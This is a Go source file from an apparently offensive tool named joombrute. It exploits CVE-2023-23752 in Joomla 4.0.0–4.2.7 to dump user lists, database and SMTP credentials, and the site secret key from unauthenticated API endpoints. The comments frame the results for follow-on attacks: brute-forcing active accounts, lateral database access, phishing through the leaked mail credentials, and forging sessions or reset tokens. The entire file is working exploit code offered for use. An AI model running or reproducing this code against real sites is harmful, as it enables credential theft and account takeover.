// Package recon implements pre-bruteforce reconnaissance against Joomla
// targets. Today this is dominated by CVE-2023-23752 (Joomla 4.0.0 - 4.2.7
// unauthenticated Webservices API info disclosure), which leaks both the
// full user list and the database credentials in plaintext.
//
// CISA added CVE-2023-23752 to the KEV catalog on 2024-01-08; it remains
// one of the most useful pre-attack primitives against Joomla 4 in the wild.
package recon

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/rvzsec/joombrute/internal/httpx"
	"github.com/rvzsec/joombrute/internal/joomla"
)

// User is a single record from /api/index.php/v1/users.
type User struct {
	ID       int    `json:"id"`
	Name     string `json:"name"`
	Username string `json:"username"`
	Email    string `json:"email"`
	Block    int    `json:"block"`
	// LastVisitDate is useful for prioritizing brute targets (active accounts
	// first). Joomla emits ISO-8601.
	LastVisitDate string `json:"lastvisitDate"`
	// Groups isn't always populated by the public endpoint but we keep it.
	Groups []int `json:"groups"`
}

// DBConfig is the subset of /api/index.php/v1/config/application that
// matters for follow-on attacks: DB creds (lateral DB access), SMTP creds
// (mail-based phishing), and the app secret (used to forge sessions,
// password reset tokens, and 2FA TOTP secret HMACs).
//
// JSON field names match Joomla's configuration.php property names - the
// API leaks them verbatim.
type DBConfig struct {
	DBType     string `json:"dbtype"`
	DBHost     string `json:"host"`
	DBName     string `json:"db"`
	DBUser     string `json:"user"`
	DBPass     string `json:"password"`
	DBPrefix   string `json:"dbprefix"`
	SiteName   string `json:"sitename"`
	SecretKey  string `json:"secret"`
	MailerHost string `json:"smtphost"`
	MailerUser string `json:"smtpuser"`
	MailerPass string `json:"smtppass"`
	MailFrom   string `json:"mailfrom"`
}

// CVE2023_23752Result is everything we managed to harvest from the two
// vulnerable endpoints. Either or both can be empty if the target is patched
// or behind a WAF.
type CVE2023_23752Result struct {
	Users     []User
	DBConfig  *DBConfig
	UsersURL  string
	ConfigURL string
}

// HasFindings reports whether anything useful came back.
func (r CVE2023_23752Result) HasFindings() bool {
	return len(r.Users) > 0 || r.DBConfig != nil
}

// Usernames returns the bare list of usernames, deduped, for feeding into the
// bruteforce wordlist. Blocked accounts are excluded - no point burning
// attempts on disabled users.
func (r CVE2023_23752Result) Usernames() []string {
	seen := make(map[string]struct{}, len(r.Users))
	out := make([]string, 0, len(r.Users))
	for _, u := range r.Users {
		if u.Block != 0 {
			continue
		}
		uname := strings.TrimSpace(u.Username)
		if uname == "" {
			continue
		}
		if _, dup := seen[uname]; dup {
			continue
		}
		seen[uname] = struct{}{}
		out = append(out, uname)
	}
	return out
}

// RunCVE2023_23752 probes both vulnerable endpoints and returns whatever it
// can scrape. It never returns an error for HTTP 401/403/404 - those just
// mean the target is patched, which is itself useful info.
//
// References:
// - Advisory: https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
// - VulnCheck writeup of the full chain to RCE.
func RunCVE2023_23752(ctx context.Context, client *http.Client, t *joomla.Target) (*CVE2023_23752Result, error) {
	r := &CVE2023_23752Result{
		UsersURL:  t.APIPath("v1/users?public=true"),
		ConfigURL: t.APIPath("v1/config/application?public=true"),
	}

	// 1. Users dump.
	if users, err := fetchUsers(ctx, client, r.UsersURL); err == nil {
		r.Users = users
	}

	// 2. App config dump.
	if cfg, err := fetchConfig(ctx, client, r.ConfigURL); err == nil {
		r.DBConfig = cfg
	}

	return r, nil
}

// joomlaAPIResp is Joomla's standard JSON:API-ish wrapper.
//
//	{ "links": {...}, "data": [ { "type":"users", "id":"1", "attributes": {...} }, ... ] }
type joomlaAPIResp struct {
	Data []struct {
		ID         string          `json:"id"`
		Attributes json.RawMessage `json:"attributes"`
	} `json:"data"`
}

// joomlaAPISingle is the response shape for /config/application which is a
// single object rather than a list.
type joomlaAPISingle struct {
	Data struct {
		Attributes json.RawMessage `json:"attributes"`
	} `json:"data"`
}

func fetchUsers(ctx context.Context, client *http.Client, u string) ([]User, error) {
	body, err := jsonGet(ctx, client, u)
	if err != nil {
		return nil, err
	}
	var wrap joomlaAPIResp
	if err := json.Unmarshal(body, &wrap); err != nil {
		return nil, fmt.Errorf("decode users: %w", err)
	}
	out := make([]User, 0, len(wrap.Data))
	for _, d := range wrap.Data {
		var u User
		if err := json.Unmarshal(d.Attributes, &u); err != nil {
			continue
		}
		out = append(out, u)
	}
	return out, nil
}

func fetchConfig(ctx context.Context, client *http.Client, u string) (*DBConfig, error) {
	body, err := jsonGet(ctx, client, u)
	if err != nil {
		return nil, err
	}
	// /config/application returns a JSON:API list where EACH config key is
	// its own data entry: data[0].attributes = {"offline": false}, data[1]
	// .attributes = {"sitename": "..."}, etc. We merge them all into one
	// flat map before binding to DBConfig.
	var asList joomlaAPIResp
	if err := json.Unmarshal(body, &asList); err == nil && len(asList.Data) > 0 {
		merged := make(map[string]json.RawMessage)
		for _, d := range asList.Data {
			var part map[string]json.RawMessage
			if err := json.Unmarshal(d.Attributes, &part); err != nil {
				continue
			}
			for k, v := range part {
				if k == "id" {
					continue
				}
				merged[k] = v
			}
		}
		if len(merged) == 0 {
			return nil, fmt.Errorf("config endpoint returned no merged keys")
		}
		mergedJSON, err := json.Marshal(merged)
		if err != nil {
			return nil, fmt.Errorf("re-encode merged config: %w", err)
		}
		var cfg DBConfig
		if err := json.Unmarshal(mergedJSON, &cfg); err != nil {
			return nil, fmt.Errorf("decode merged config: %w", err)
		}
		return &cfg, nil
	}
	// Fallback: single-object form (older / non-standard responses).
	var asObj joomlaAPISingle
	if err := json.Unmarshal(body, &asObj); err != nil {
		return nil, fmt.Errorf("decode config: %w", err)
	}
	var cfg DBConfig
	if err := json.Unmarshal(asObj.Data.Attributes, &cfg); err != nil {
		return nil, fmt.Errorf("decode config (obj): %w", err)
	}
	return &cfg, nil
}

func jsonGet(ctx context.Context, client *http.Client, u string) ([]byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil, err
	}
	httpx.SetUA(req, "")
	req.Header.Set("Accept", "application/vnd.api+json, application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
}
